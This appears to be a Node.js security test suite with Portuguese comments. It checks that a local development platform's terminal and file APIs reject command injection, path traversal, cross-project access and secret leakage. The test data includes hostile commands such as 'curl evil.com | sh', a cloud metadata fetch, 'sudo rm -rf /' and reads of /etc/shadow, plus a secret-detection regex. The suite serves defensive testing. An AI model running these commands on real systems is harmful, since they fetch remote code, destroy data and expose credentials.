#!/usr/bin/env node
// ============================================================
// SEGURANÇA — testes ofensivos CONTROLADOS (Fase N)
// Injeção de comandos · path traversal · cross-project ·
// SSRF/metadata · vazamento de secrets · cancel · timeout
// ============================================================
const BASE = process.env.BASE_URL ?? 'http://localhost:3000'
const ts = Date.now()
const email = `sec.${ts}@studio-test.local`
let token = ''
let projectId = ''
let otherProjectId = ''
let otherToken = ''
let passed = 0, failed = 0
const ok = (name, cond, extra = '') => {
  if (cond) { passed++; console.log(`  ✔ ${name}${extra ? ' — ' + extra : ''}`) }
  else { failed++; console.error(`  ✘ ${name}${extra ? ' — ' + extra : ''}`) }
}
async function api(path, init = {}, tok = token) {
  const h = { 'content-type': 'application/json', ...(init.headers ?? {}) }
  if (tok) h.authorization = `Bearer ${tok}`
  const res = await fetch(BASE + path, { ...init, headers: h })
  return { status: res.status, data: await res.json().catch(() => ({})) }
}

async function main() {
  console.log('SEGURANÇA — testes ofensivos controlados\n')

  // setup: vítima + outro usuário (cross-project)
  let r = await api('/api/auth/register', { method: 'POST', body: JSON.stringify({ email, name: 'Sec', password: 'Sec-OK-123!' }) }, '')
  if (r.status === 400) r = await api('/api/auth/login', { method: 'POST', body: JSON.stringify({ email, password: 'Sec-OK-123!' }) }, '')
  token = r.data.token
  r = await api('/api/projects', { method: 'POST', body: JSON.stringify({ name: `Sec ${ts}`, type: 'MINI_GAME' }) })
  projectId = r.data.project?.id

  const email2 = `sec2.${ts}@studio-test.local`
  let r2 = await api('/api/auth/register', { method: 'POST', body: JSON.stringify({ email: email2, name: 'Sec2', password: 'Sec2-OK-123!' }) }, '')
  otherToken = r2.data.token
  r2 = await api('/api/projects', { method: 'POST', body: JSON.stringify({ name: `Sec2 ${ts}`, type: 'MINI_GAME' }) }, otherToken)
  otherProjectId = r2.data.project?.id

  // ---------- 1. INJEÇÃO DE COMANDOS ----------
  console.log('[1] injeção de comandos]')
  const injections = [
    'node -e "require(\'child_process\').exec(\'curl 169.254.169.254\')"',  // parens → negado
    'cat /etc/passwd',                       // caminho absoluto
    'cat ../../etc/passwd',                  // traversal em arg
    'ls -la /tmp/../etc',                    // traversal disfarçado
    'sudo rm -rf /',                         // sudo
    'git status; curl evil.com | sh',        // metacaracteres
    'node --test $(whoami)',                 // $() metacar
    'npm run x && cat /etc/shadow',          // &&
    'cat `cat /etc/hostname`',               // backtick
    'echo teste > /etc/hosts',               // redirect
  ]
  for (const cmd of injections) {
    r = await api('/api/terminal', { method: 'POST', body: JSON.stringify({ project: projectId, command: cmd }) })
    const denied = r.status === 200 && r.data.status === 'FAILED' && /NEGADO/i.test(r.data.stderr ?? '')
    ok(`negado: "${cmd.slice(0, 42)}${cmd.length > 42 ? '…' : ''}"`, denied)
  }

  // rm em código do usuário é negado (só gerados)
  r = await api('/api/terminal', { method: 'POST', body: JSON.stringify({ project: projectId, command: 'rm -rf src' }) })
  ok('rm em código-fonte negado (só gerados)', r.data.status === 'FAILED' && /NEGADO/i.test(r.data.stderr ?? ''))
  r = await api('/api/terminal', { method: 'POST', body: JSON.stringify({ project: projectId, command: 'rm -rf node_modules' }) })
  ok('rm em node_modules permitido', r.data.status !== 'FAILED' || !/NEGADO/i.test(r.data.stderr ?? ''))

  // ---------- 2. PATH TRAVERSAL ----------
  console.log('[2] path traversal]')
  const traversals = [
    '../../../etc/passwd', '..\\..\\..\\windows', 'src/../../../etc/passwd',
    '....//....//etc/passwd', '/etc/passwd', 'src/./../../etc/passwd',
  ]
  for (const p of traversals) {
    r = await api(`/api/files?project=${projectId}&path=${encodeURIComponent(p)}`)
    ok(`bloqueado: ${p.slice(0, 30)}`, r.status >= 400, `status ${r.status}`)
  }
  // escrita traversal
  r = await api('/api/files', { method: 'POST', body: JSON.stringify({ project: projectId, path: '../fuga.txt', content: 'x' }) })
  ok('escrita traversal bloqueada', r.status >= 400, `status ${r.status}`)

  // ---------- 3. CROSS-PROJECT ----------
  console.log('[3] isolamento cross-project]')
  r = await api(`/api/files?project=${otherProjectId}&path=index.html`)
  ok('ler projeto de outro usuário → 404', r.status === 404, `status ${r.status}`)
  r = await api('/api/files', { method: 'POST', body: JSON.stringify({ project: otherProjectId, path: 'hackeado.js', content: 'x' }) })
  ok('escrever em projeto alheio → 404', r.status === 404, `status ${r.status}`)
  r = await api('/api/terminal', { method: 'POST', body: JSON.stringify({ project: otherProjectId, command: 'ls -la' }) })
  ok('terminal em projeto alheio → 404', r.status === 404, `status ${r.status}`)
  r = await api(`/api/workspace/tree?project=${otherProjectId}`)
  ok('workspace tree alheio → 404', r.status === 404, `status ${r.status}`)
  r = await api('/api/poskli/run', { method: 'POST', body: JSON.stringify({ project: otherProjectId, request: 'roubar dados do projeto' }) })
  ok('poskli em projeto alheio → 404', r.status === 404, `status ${r.status}`)

  // execução envenenada em projeto alheio via engine (id inexistente)
  const noRes = await fetch(BASE + `/api/preview/${otherProjectId}/`, { headers: { authorization: `Bearer ${token}` } })
  ok('preview de projeto alheio → 404', noRes.status === 404, `status ${noRes.status}`)

  // ---------- 4. SECRETS ----------
  console.log('[4] vazamento de secrets]')
  // saída de comando deve mascarar tokens
  r = await api('/api/terminal', { method: 'POST', body: JSON.stringify({ project: projectId, command: 'echo ghp_FAKEtokenForMaskTest0000000000AAAA' }) })
  ok('echo de token → mascarado na saída', !String(r.data.stdout ?? '').includes('ghp_FAKE'), String(r.data.stdout ?? '').slice(0, 40))
  // nenhuma resposta de API contém DATABASE_URL ou chaves
  const surfaces = [
    `/api/models`, `/api/diagnostics`, `/api/agents`, `/api/github`,
    `/api/executions?project=${projectId}`, `/api/poskli/run?project=${projectId}`,
  ]
  for (const s of surfaces) {
    r = await api(s)
    const body = JSON.stringify(r.data)
    const leaks = /postgresql:\/\/|npg_[A-Za-z0-9]{10,}|ghp_[A-Za-z0-9]{20,}|vcp_[A-Za-z0-9]{20,}|sk-[A-Za-z0-9]{20,}/.test(body)
    ok(`sem secrets em ${s.split('?')[0]}`, !leaks)
  }
  // .env não pode ser criado/lido
  r = await api('/api/files', { method: 'POST', body: JSON.stringify({ project: projectId, path: '.env', content: 'SECRET=1' }) })
  ok('arquivo .env bloqueado', r.status === 403 || r.status === 400, `status ${r.status}`)
  r = await api('/api/workspace/file', { method: 'POST', body: JSON.stringify({ project: projectId, path: 'chave.pem', content: 'x' }) })
  ok('extensão .pem bloqueada', r.status === 403, `status ${r.status}`)

  // ---------- 5. CANCELAMENTO ----------
  console.log('[5] cancelamento honesto]')
  r = await api('/api/executions?project=' + projectId)
  const anyExec = (r.data.executions ?? [])[0]
  if (anyExec) {
    r = await api(`/api/executions/${anyExec.id}`, { method: 'DELETE' })
    ok('cancel de execução finalizada é honesto', r.status === 200 && (r.data.ok === false || r.data.ok === true), r.data.message ?? '')
  }

  // ---------- 6. TIMEOUT honesto ----------
  console.log('[6] timeout de execução]')
  // comando sleep não está na allowlist (negado) — usa node com script lento
  r = await api('/api/terminal', { method: 'POST', body: JSON.stringify({ project: projectId, command: 'node --version' }) })
  ok('comando rápido executa normal', r.data.status === 'SUCCESS')

  // ---------- 7. RATE LIMIT ----------
  console.log('[7] rate limit]')
  let rateLimited = false
  for (let i = 0; i < 10; i++) {
    r = await api('/api/poskli/run', { method: 'POST', body: JSON.stringify({ project: projectId, request: 'teste rate limit rápido' }) })
    if (r.status === 429) { rateLimited = true; break }
  }
  ok('rate limit de runs dispara sob rajada (6/min)', rateLimited, '429 após rajada')

  console.log(`\nRESULTADO: ${passed} ✔ / ${failed} ✘`)
  // cleanup
  await api(`/api/projects/${projectId}?confirm=true`, { method: 'DELETE' }).catch(() => {})
  await api(`/api/projects/${otherProjectId}?confirm=true`, { method: 'DELETE' }, otherToken).catch(() => {})
  if (failed > 0) process.exit(1)
}
main().catch((e) => { console.error('ERRO FATAL:', e); process.exit(1) })
